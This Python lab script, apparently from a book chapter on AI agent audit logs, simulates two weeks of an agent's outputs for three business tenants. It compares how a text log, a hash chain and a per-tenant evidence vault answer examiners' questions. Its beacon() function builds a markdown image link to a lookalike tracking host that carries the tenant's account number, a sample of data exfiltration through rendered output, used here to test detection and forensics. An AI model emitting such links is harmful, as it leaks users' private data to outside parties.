#!/usr/bin/env python3
"""Chapter 13, lab 1: what three kinds of log can answer. No model. A seeded 14-day history for three tenants (about 1,300 outputs, 60 approvals, 8 support reads) is generated with the
REAL Chapter 12 egress layer, including the incident of Chapter 12 (a lookalike tracking pixel, 11 deliveries before the fix, 3 refusals and one canary after it). The same history is written three ways:
A  free-text application log (what most teams have: one line per event, urls and recipients as written, secrets wherever they fell)
B  the Chapter 2 chain (principal, agent, tool, policy, allow, reason; hashed, shared by all tenants)
C  the Chapter 13 evidence vault (typed events, one chain per tenant, keyed digests, per-tenant content store)
Thirteen questions an examiner asks are put to each. An answer counts only if it equals the truth computed from the generator."""
import sys, json, random, hashlib, re, time
from pathlib import Path
here = Path(__file__).resolve().parent; sys.path.insert(0, str(here))
from bulwark.egress import Ctx, Output, Egress, contains_private, URL
from bulwark.evidence import Vault, ChainLog, egress_event, host_only, canon
rng = random.Random(1301)
DAY = 86400; T0 = 1793664000      # 2026-11-03 00:00 UTC-ish; only differences matter
TEN = {"biz_hcb": ("Hill Country Bakehouse", "US-ACC-77120934", "TX-48213"), "biz_bcp": ("Barton Creek Plumbing", "US-ACC-55120871", "TX-90177"), "biz_riv": ("Riverside Office Interiors", "US-ACC-33410988", "TX-11902")}
CONT = {"biz_hcb": ["orders@lonestar-paper.example", "ap@zilker-packaging.example"], "biz_bcp": ["sales@hajek-supply.example", "ar@lonestar-paper.example"], "biz_riv": ["ap@zilker-packaging.example", "billing@kerbey-lumber.example"]}
APPROVED = {"biz_hcb": "emily", "biz_bcp": "tomas", "biz_riv": "dana"}
def ctx(t): return Ctx(t, ("ledgerly.example", "lonestar-paper.example"), ("files.sharehost.example",), frozenset(CONT[t]), (TEN[t][1], TEN[t][2]))
def benign(t, n):
    k = rng.random()
    if k < .4: return Output("email", to=rng.choice(CONT[t]), body=f"Reminder: INV-{1000+n} is due next week. https://app.ledgerly.example/invoices/INV-{1000+n}")
    if k < .75: return Output("render", body=f"Invoice INV-{1000+n} is [here](https://app.ledgerly.example/invoices/INV-{1000+n}).")
    if k < .9: return Output("request", url=f"https://lonestar-paper.example/pay?inv=INV-{1000+n}")
    return Output("render", body=f"Summary INV-{1000+n}.\n\n![Ledgerly](https://cdn.ledgerly.example/logo.png)")
def beacon(t): return Output("render", body=f"Done.\n\n![](https://track.lonestar-pay.example/r.gif?inv=INV-1007&acct={TEN[t][1]})")
TRUTH = []     # one dict per event
n = 0
FIX_DAY = 9
for d in range(14):
    for t in TEN:
        level = 0 if d < FIX_DAY else 4; policy = "v0.12" if d < FIX_DAY else "v0.13"
        outs = [benign(t, n + i) for i in range(rng.randrange(28, 36))]; n += len(outs)
        if t == "biz_hcb":
            if d in (5, 6, 7, 8): outs += [beacon(t) for _ in range([3, 3, 3, 2][d - 5])]      # 11 deliveries before the fix
            if d == FIX_DAY + 1: outs += [beacon(t) for _ in range(3)]
        for i, o in enumerate(outs):
            eg = Egress(level, ctx(t)) if level else None
            if eg: ok, why, left = eg.check(o)
            else: ok, why, left = True, "ok", (o.body or o.url or o.to)
            edits = 0
            if eg and ok and o.kind != "request": edits = eg.render(o.body)[1]
            priv = contains_private(o.body or o.url or o.to, ctx(t).private_values); canary = priv and d >= FIX_DAY
            ts = T0 + d * DAY + 8 * 3600 + i * 600 + rng.randrange(0, 300)
            TRUTH.append(dict(ev="egress", tenant=t, ts=ts, day=d, tool=o.kind, ok=ok, why=why, level=level, policy=policy, to=o.to, host=host_only(o.url or o.to) if o.kind != "render" else "",
                              out=(o.body or o.url or o.to), left=left, edits=edits, private_in_output=priv, delivered_private=bool(ok and priv and contains_private(left, ctx(t).private_values)),
                              canary=bool(canary), render_host=(URL.findall(o.body)[0].split("/")[2] if o.kind == "render" and URL.findall(o.body) else "")))
    for t in TEN:
        for j in range(rng.choice([1, 2])):   # approvals
            ts = T0 + d * DAY + 14 * 3600 + j * 1800; amt = rng.randrange(20000, 400000)
            TRUTH.append(dict(ev="approval", tenant=t, ts=ts, day=d, approver=APPROVED[t], ms=rng.randrange(2500, 40000), effect=hashlib.sha256(f"{t}|{d}|{j}|{amt}".encode()).hexdigest(), amount=amt, why="approved"))
for d, t, actor, grant in [(2, "biz_bcp", "support_amy", "g_881"), (4, "biz_hcb", "support_raj", "g_902"), (4, "biz_hcb", "support_raj", "g_902"), (7, "biz_riv", "support_amy", "g_910"), (9, "biz_hcb", "support_lee", ""), (11, "biz_bcp", "support_lee", "g_955"), (12, "biz_riv", "support_raj", "g_961"), (13, "biz_hcb", "support_amy", "g_970")]:
    TRUTH.append(dict(ev="support_read", tenant=t, ts=T0 + d * DAY + 11 * 3600, day=d, actor=actor, grant=grant, why="read"))
TRUTH.sort(key=lambda e: e["ts"])
json.dump(TRUTH, open(here / "results" / "ch13_history.json", "w"), default=str)
print("events:", len(TRUTH), {k: sum(1 for e in TRUTH if e["ev"] == k) for k in ("egress", "approval", "support_read")})

# ------------------------------------------------------------------ write the three logs
A = []   # (ts, tenant, line)
for e in TRUTH:
    if e["ev"] == "egress":
        if e["ok"]:
            if e["tool"] == "email": line = f"INFO quill.send tenant={e['tenant']} to={e.get('to','?')} body={e['out'][:120]!r}"
            elif e["tool"] == "render": line = f"INFO quill.reply tenant={e['tenant']} text={e['out']!r}"
            else: line = f"INFO quill.fetch tenant={e['tenant']} url={e['out']}"
        else: line = f"WARN egress blocked {e['tool']} tenant={e['tenant']} reason={e['why']}" + (f" url={e['out']}" if e["tool"] == "request" else "")
        if e["canary"]: line += " CANARY_HIT"
    elif e["ev"] == "approval": line = f"INFO approval granted tenant={e['tenant']} user={e['approver']} amount={e['amount']}"
    else: line = f"INFO support session tenant={e['tenant']} user={e['actor']}"
    A.append((e["ts"], e["tenant"], line))

B = ChainLog()   # shared chain; rows carry tenant as the principal's business
for e in TRUTH:
    if e["ev"] == "egress": B.append(dict(principal=e["tenant"], agent="quill", tool=e["tool"], policy=e["policy"], allow=e["ok"], reason=e["why"][:60]))
    elif e["ev"] == "approval": B.append(dict(principal=e["tenant"], agent="quill", tool="approve_payment", policy="v0.13", allow=True, reason="ok"))
    else: B.append(dict(principal=e["tenant"], agent="support", tool="support_read", policy="v0.13", allow=True, reason="ok"))

V = Vault(b"\x13" * 32, anchor_every=25)
for e in TRUTH:
    if e["ev"] == "egress":
        class O: pass
        o = O(); o.kind = e["tool"]; o.body = e["out"] if e["tool"] == "render" else e["out"]; o.url = e["out"] if e["tool"] == "request" else ""; o.to = ""
        if e["tool"] == "email": o.to = e["out"].split(" ")[0] if False else ""
        host = e["host"]
        ev = V.record(e["tenant"], content={"output": e["out"], "left": e["left"]}, ts=e["ts"], kind="egress", principal=e["tenant"], task="notify", tool=e["tool"], decision="ALLOW" if e["ok"] else "DENY",
                      reasons=[e["why"].replace(":", ".")[:48]], policy=e["policy"], level=e["level"], dest_host=host or e["render_host"], out_digest=V.ev.digest(e["tenant"], e["out"]), ctx_digest=V.ev.digest(e["tenant"], e["left"]),
                      edits=e["edits"], canary=e["canary"], bytes_out=len(e["left"].encode()))
    elif e["ev"] == "approval":
        V.record(e["tenant"], ts=e["ts"], kind="approval", principal=e["tenant"], approver=e["approver"], approval_ms=e["ms"], effect_digest=e["effect"], decision="APPROVED", reasons=["ok"], policy="v0.13")
    else:
        V.record(e["tenant"], ts=e["ts"], kind="support_read", principal=e["tenant"], actor=e["actor"], grant=e["grant"] or "none", decision="READ", reasons=["ok"] if e["grant"] else ["NO_GRANT"], policy="v0.13")
for t in TEN: V.seal(t)

# ------------------------------------------------------------------ questions
S = TRUTH
eg = [e for e in S if e["ev"] == "egress"]
def has_priv(text, t=None): return any(contains_private(text, (v[1], v[2])) for k, v in TEN.items() if t in (None, k))
Q = {}
# Q1 delivered outputs by destination host, all tenants (renders count by the first link host)
truth1 = {}
for e in eg:
    if e["ok"]: h = e["host"] or e["render_host"]; truth1[h] = truth1.get(h, 0) + 1 if h else truth1.get(h, 0)
truth1.pop("", None)
def a1_A():
    out = {}
    for ts, t, l in A:
        if l.startswith("INFO quill.fetch"): h = host_only(re.search(r"url=(\S+)", l).group(1)); out[h] = out.get(h, 0) + 1
        elif l.startswith("INFO quill.reply"):
            u = URL.findall(l)
            if u: h = u[0].split("/")[2]; out[h] = out.get(h, 0) + 1
        elif l.startswith("INFO quill.send"): h = host_only(re.search(r"to=(\S+)", l).group(1)); out[h] = out.get(h, 0) + 1
    return out
def a1_C(): 
    out = {}
    for t, lg in V.logs.items():
        for r in lg.rows:
            if r["kind"] == "egress" and r["decision"] == "ALLOW" and r.get("dest_host"): out[r["dest_host"]] = out.get(r["dest_host"], 0) + 1
    return out
Q["Q1 delivered outputs by destination host"] = (truth1, a1_A(), None, a1_C())
# Q2 refusals by reason code
t2 = {}
for e in eg:
    if not e["ok"]: t2[e["why"].replace(":", ".")[:48]] = t2.get(e["why"].replace(":", ".")[:48], 0) + 1
def a2_A():
    o = {}
    for ts, t, l in A:
        m = re.search(r"WARN egress blocked .* reason=(\S+)", l)
        if m: o[m.group(1).replace(":", ".")[:48]] = o.get(m.group(1).replace(":", ".")[:48], 0) + 1
    return o
def a2_B():
    o = {}
    for r in B.rows:
        if r["tool"] in ("email", "render", "request") and not r["allow"]: k = r["reason"].replace(":", ".")[:48]; o[k] = o.get(k, 0) + 1
    return o
def a2_C():
    o = {}
    for lg in V.logs.values():
        for r in lg.rows:
            if r["kind"] == "egress" and r["decision"] == "DENY": o[r["reasons"][0]] = o.get(r["reasons"][0], 0) + 1
    return o
Q["Q2 refusals by reason code"] = (t2, a2_A(), a2_B(), a2_C())
# Q3 policy version and level in force for the 11 pre-fix beacon deliveries of tenant biz_hcb
t3 = sorted({(e["policy"], e["level"]) for e in eg if e["tenant"] == "biz_hcb" and e["ok"] and e["private_in_output"] and e["day"] < FIX_DAY})
def a3_B():
    rows = [r for r in B.rows if r["principal"] == "biz_hcb" and r["tool"] == "render" and r["allow"] and r["policy"] == "v0.12"]; return None if not rows else [(rows[0]["policy"], None)]
def a3_C():
    s = set()
    for r in V.logs["biz_hcb"].rows:
        if r["kind"] == "egress" and r["decision"] == "ALLOW" and r["policy"] == "v0.12" and r.get("dest_host") == "track.lonestar-pay.example": s.add((r["policy"], r["level"]))
    return sorted(s)
Q["Q3 policy and level in force when the pixel was delivered"] = (t3, None, a3_B(), a3_C())
# Q4 outputs altered by the renderer (edits > 0)
t4 = sum(1 for e in eg if e["edits"] > 0)
Q["Q4 outputs the renderer altered"] = (t4, None, None, sum(1 for lg in V.logs.values() for r in lg.rows if r.get("edits", 0) > 0))
# Q5 canary hits
t5 = sum(1 for e in eg if e["canary"])
Q["Q5 canary hits"] = (t5, sum(1 for _, _, l in A if "CANARY_HIT" in l), None, sum(1 for lg in V.logs.values() for r in lg.rows if r.get("canary")))
# Q6 first delivery of an output with a foreign host (earliest day)
t6 = min(e["day"] for e in eg if e["ok"] and e["private_in_output"])
def a6_A():
    ds = [(ts - T0) // DAY for ts, t, l in A if "track.lonestar-pay.example" in l and l.startswith("INFO")]; return min(ds) if ds else None
def a6_C():
    ds = [(r["ts"] - T0) // DAY for lg in V.logs.values() for r in lg.rows if r.get("dest_host") == "track.lonestar-pay.example" and r["decision"] == "ALLOW"]; return min(ds) if ds else None
Q["Q6 first day the pixel was delivered"] = (t6, a6_A(), None, a6_C())
# Q7 did the account number leave the product, and in which events (needs content or a logged url)
t7 = sum(1 for e in eg if e["delivered_private"])
def a7_A(): return sum(1 for ts, t, l in A if l.startswith("INFO") and has_priv(l))      # the log holds the value, and a search finds it
def a7_C():
    n = 0
    for t, lg in V.logs.items():
        for r in lg.rows:
            if r["kind"] != "egress" or r["decision"] != "ALLOW": continue
            raw = V.stores[t].get(f"{r['seq']}:left")
            if raw is not None and contains_private(raw.decode(), (TEN[t][1], TEN[t][2])): n += 1
    return n
Q["Q7 events where a private value left (count)"] = (t7, a7_A(), None, a7_C())
# Q8 approver, time to approve and the effect digest bound, for the 4th approval of biz_hcb
ap = [e for e in S if e["ev"] == "approval" and e["tenant"] == "biz_hcb"][3]
t8 = (ap["approver"], ap["ms"], ap["effect"])
def a8_A():
    ar = [(ts, l) for ts, t, l in A if t == "biz_hcb" and l.startswith("INFO approval")][3]; return (re.search(r"user=(\w+)", ar[1]).group(1), None, None)
def a8_C(): r = [r for r in V.logs["biz_hcb"].rows if r["kind"] == "approval"][3]; return (r["approver"], r["approval_ms"], r["effect_digest"])
Q["Q8 who approved payment 4 of biz_hcb, how fast, and the effect they saw"] = (t8, a8_A(), None, a8_C())
# Q9 staff reads of tenant biz_hcb outside a grant
t9 = sorted(e["actor"] for e in S if e["ev"] == "support_read" and e["tenant"] == "biz_hcb" and not e["grant"])
def a9_A(): return None     # sessions are logged, grants are not: "support session ... user=" lines say who, never under which grant
def a9_C(): return sorted(r["actor"] for r in V.logs["biz_hcb"].rows if r["kind"] == "support_read" and r["grant"] == "none")
Q["Q9 staff reads of biz_hcb with no grant"] = (t9, a9_A(), None, a9_C())
# Q10 can the tenant verify its own events from an export that holds no one else's rows
def rows_for_A(t): return [l for ts, tt, l in A if tt == t]
t10 = 0
exp = V.export("biz_hcb")
ok10, _ = ChainLog.verify_rows(exp["rows"]); foreign10 = sum(1 for r in exp["rows"] if r["tenant"] != "biz_hcb")
shared_rows = [r for r in B.rows if r["principal"] == "biz_hcb"]; okB, _ = ChainLog.verify_rows(shared_rows)
Q["Q10 tenant verifies its own events from an export with no foreign rows"] = (True, False, okB, ok10 and foreign10 == 0)
# Q11 tamper: delete one pixel delivery; does the log show something was removed?
def del_idx_rows(rows, f):
    i = next(i for i, r in enumerate(rows) if f(r)); return rows[:i] + rows[i + 1:]
bB = del_idx_rows(B.rows, lambda r: r["tool"] == "render" and r["policy"] == "v0.12" and r["principal"] == "biz_hcb")
bC = del_idx_rows(V.logs["biz_hcb"].rows, lambda r: r.get("dest_host") == "track.lonestar-pay.example")
Q["Q11 a deleted pixel delivery is detected"] = (True, False, not ChainLog.verify_rows(bB)[0], not ChainLog.verify_rows(bC)[0])
# Q12 does the log itself hold a private value of any tenant
def has_any(txt): return any(contains_private(txt, (v[1], v[2])) for v in TEN.values())
a12 = sum(1 for ts, t, l in A if has_any(l)); b12 = sum(1 for r in B.rows if has_any(json.dumps(r))); c12 = sum(1 for lg in V.logs.values() for r in lg.rows if has_any(json.dumps(r)))
Q["Q12 the log holds no private value (rows that do)"] = (0, a12, b12, c12)
# Q13 reproduce one decision: re-run the egress layer at the level in force on the stored output
e13 = next(e for e in eg if e["tenant"] == "biz_hcb" and e["private_in_output"] and e["day"] < FIX_DAY); t13 = Egress(4, ctx("biz_hcb")).check(Output("render", body=e13["out"]))[:2]
def a13_C():
    r = next(r for r in V.logs["biz_hcb"].rows if r.get("dest_host") == "track.lonestar-pay.example"); raw = V.stores["biz_hcb"].get(f"{r['seq']}:output"); return Egress(4, ctx("biz_hcb")).check(Output("render", body=raw.decode()))[:2]
Q["Q13 replay the stored pixel output at today's policy (E4)"] = (t13, None, None, a13_C())

res = {}; L = []
L.append(f"{'question':80} A text log   B chain   C vault")
score = {"A": 0, "B": 0, "C": 0}
def eq(t, a):
    if a is None: return False
    if isinstance(t, dict): return {k: v for k, v in a.items()} == t if isinstance(a, dict) else False
    return a == t
for q, (truth, a, b, c) in Q.items():
    ra, rb, rc = eq(truth, a), eq(truth, b), eq(truth, c)
    if q.startswith("Q12"): ra, rb, rc = (a == 0), (b == 0), (c == 0)
    if q.startswith("Q10") or q.startswith("Q11"): ra, rb, rc = (a is True), (b is True), (c is True)
    for k, r in zip("ABC", (ra, rb, rc)): score[k] += r
    L.append(f"{q:80} {'yes' if ra else 'no':10} {'yes' if rb else 'no':9} {'yes' if rc else 'no'}")
    res[q] = dict(truth=str(truth)[:200], A=str(a)[:200], B=str(b)[:200], C=str(c)[:200], ok=dict(A=ra, B=rb, C=rc))
L.append(f"{'answered correctly (of 13)':80} {score['A']:<10} {score['B']:<9} {score['C']}")
# size and cost
szA = sum(len(l) + 1 for _, _, l in A); szB = sum(len(canon(r)) + 1 for r in B.rows); szC = sum(len(canon(r)) + 1 for lg in V.logs.values() for r in lg.rows); szS = sum(len(v) for st in V.stores.values() for v in st.items.values())
n_ev = len(TRUTH); L.append(f"bytes per event: A {szA/n_ev:.0f}, B {szB/n_ev:.0f}, C chain {szC/n_ev:.0f} (+ content store {szS/n_ev:.0f} per event, encrypted)")
t0 = time.perf_counter(); [V.verify(t) for t in TEN]; tv = time.perf_counter() - t0
L.append(f"verify all three tenant chains with anchors: {tv*1000:.1f} ms for {sum(len(l.rows) for l in V.logs.values())} rows")
print("\n".join(L)); json.dump(dict(events=n_ev, score=score, questions=res, bytes_per_event=dict(A=szA/n_ev, B=szB/n_ev, C=szC/n_ev, store=szS/n_ev), verify_ms=tv * 1000), open(here / "results" / "ch13_questions.json", "w"), indent=1, default=str)
open(here / "results" / "ch13_questions.log", "w").write("\n".join(L) + "\n")
